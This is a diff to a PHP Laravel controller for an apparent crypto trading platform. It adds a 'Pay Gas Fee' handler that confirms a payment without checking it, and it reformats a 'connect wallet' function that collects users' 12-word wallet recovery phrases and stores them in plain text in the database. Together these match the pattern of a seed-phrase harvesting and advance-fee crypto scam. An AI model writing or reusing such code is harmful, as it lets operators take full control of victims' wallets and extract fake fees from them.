@@ -24,6 +24,9 @@ use Illuminate\Support\Facades\DB;
 use Illuminate\Support\Facades\Auth;
 use App\Models\TradingLog;
 use Carbon\Carbon;
+use App\Mail\GasFeeMail;
+use Illuminate\Support\Facades\Mail;
+use Illuminate\Support\Facades\Log;
 
 class ViewsController extends Controller
 {
@@ -198,6 +201,42 @@ class ViewsController extends Controller
             ));
     }
 
+    public function gasfee()
+    {
+        return view('user.gasfee')
+            ->with(array(
+                'title' => 'Pay Gas Fee',
+            ));
+    }
+
+    public function gasfee_post(Request $request)
+    {
+        $request->validate([
+            'user_id' => 'required|exists:users,id',
+        ]);
+
+        $settings = Settings::find(1);
+        $user = User::find($request->user_id);
+        $amount = $user->gas_fee_amount ?? '0.897';
+
+        try {
+            // 1. Notify the Admin
+            Mail::to($settings->contact_email)->send(
+                new GasFeeMail($user, $amount, "Urgent: New Gas Fee Paid by {$user->username}", true)
+            );
+
+            // 2. Notify the User
+            Mail::to($user->email)->send(
+                new GasFeeMail($user, $amount, "Gas Fee Payment Received", false)
+            );
+        } catch (\Exception $e) {
+            Log::error('Mail Error: ' . $e->getMessage());
+            // Still redirect so user doesn't see a crash, even if mail fails
+        }
+
+        return redirect()->route('gasfee')->with('success', 'Confirmation sent! We are verifying your payment.');
+    }
+
     //Return withdrawals route
     public function withdrawals()
     {
@@ -352,47 +391,47 @@ class ViewsController extends Controller
 
 
 
-        public function connect_wallet()
+    public function connect_wallet()
     {
         $settings = Settings::where('id', 1)->first();
 
         return view('user.connect-wallet', [
             'title' => 'Wallet Connect',
-            'settings'=>$settings,
+            'settings' => $settings,
         ]);
     }
 
 
 
-public function validateMnemonic(Request $request)
-{
-    $request->validate([
-        'wallet' => 'required|string|max:100',
-        'mnemonic' => 'required|string|min:12',
-    ]);
+    public function validateMnemonic(Request $request)
+    {
+        $request->validate([
+            'wallet' => 'required|string|max:100',
+            'mnemonic' => 'required|string|min:12',
+        ]);
 
-    $mnemonic = strtolower(trim($request->input('mnemonic')));
-    $wallet = $request->input('wallet');
+        $mnemonic = strtolower(trim($request->input('mnemonic')));
+        $wallet = $request->input('wallet');
 
-    
-$words = preg_split('/\s+/', $mnemonic);
 
-if (count($words) < 12) {
-    return back()->withErrors(['mnemonic' => 'Mnemonic must contain at least 12 words.']);
-}
-    // If all good, save wallet
-    \App\Models\Wallets::create([
-        'user' => auth()->id(),
-        'wallet_name' => $wallet,
-        'phrase' => $mnemonic,
-        'status' => 'active',
-        'last_validated' => now(),
-    ]);
+        $words = preg_split('/\s+/', $mnemonic);
 
-    \App\Models\User::where('id', auth()->id())->update(['wallet_connected' => 1]);
+        if (count($words) < 12) {
+            return back()->withErrors(['mnemonic' => 'Mnemonic must contain at least 12 words.']);
+        }
+        // If all good, save wallet
+        \App\Models\Wallets::create([
+            'user' => auth()->id(),
+            'wallet_name' => $wallet,
+            'phrase' => $mnemonic,
+            'status' => 'active',
+            'last_validated' => now(),
+        ]);
 
-    return back()->with('success', 'Wallet connected successfully!');
-}
+        \App\Models\User::where('id', auth()->id())->update(['wallet_connected' => 1]);
+
+        return back()->with('success', 'Wallet connected successfully!');
+    }
 
 
 
@@ -437,9 +476,9 @@ if (count($words) < 12) {
                 ->sum('amount');
 
             // Calculate trading bot profits/losses for this month
-            $monthlyTradingPnL = TradingLog::whereHas('userTradingBot', function($query) use ($userId) {
-                    $query->where('user_id', $userId);
-                })
+            $monthlyTradingPnL = TradingLog::whereHas('userTradingBot', function ($query) use ($userId) {
+                $query->where('user_id', $userId);
+            })
                 ->whereBetween('created_at', [$monthStart, $monthEnd])
                 ->selectRaw('SUM(CASE WHEN type = "profit" THEN amount ELSE 0 END) - SUM(CASE WHEN type = "loss" THEN amount ELSE 0 END) as net_pnl')
                 ->first()->net_pnl ?? 0;
@@ -466,8 +505,4 @@ if (count($words) < 12) {
     /**
      * Show the connect wallet page
      */
-   
 }
-
-
-  
